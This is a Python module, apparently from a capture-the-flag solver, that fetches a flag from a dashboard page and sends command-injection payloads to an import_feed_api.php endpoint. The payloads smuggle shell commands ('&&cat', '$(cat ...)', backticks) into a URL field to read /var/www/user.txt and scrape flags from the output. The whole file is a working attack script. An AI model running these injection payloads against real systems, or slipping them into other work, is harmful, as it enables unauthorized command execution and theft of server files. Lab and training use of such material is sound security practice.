from __future__ import annotations

from dataclasses import dataclass

from .extractors import extract_first_flag, try_parse_json
from .http_client import HttpClient


@dataclass
class TamperFinding:
    endpoint: str
    payload: str
    raw_response: str
    extracted_flag: str | None


def fetch_dashboard_flag(client: HttpClient) -> str | None:
    response = client.request("GET", "dashboard.php", allow_redirects=False)
    if response.status_code != 200:
        return None
    return extract_first_flag(response.text)


def run_post_auth_probes(client: HttpClient) -> list[TamperFinding]:
    findings: list[TamperFinding] = []

    feed_payloads = [
        "http://example.com",
        "http://x&&cat /var/www/user.txt",
        "http://x$(cat /var/www/user.txt)",
        "http://x`cat /var/www/user.txt`",
    ]

    for payload in feed_payloads:
        response = client.request(
            "POST",
            "import_feed_api.php",
            data={"url": payload},
        )
        raw = response.text
        parsed = try_parse_json(raw)
        response_blob = raw
        if parsed and "cmd_output" in parsed:
            response_blob = str(parsed.get("cmd_output", "")) + "\n" + raw

        findings.append(
            TamperFinding(
                endpoint="import_feed_api.php",
                payload=payload,
                raw_response=raw,
                extracted_flag=extract_first_flag(response_blob),
            )
        )

    return findings
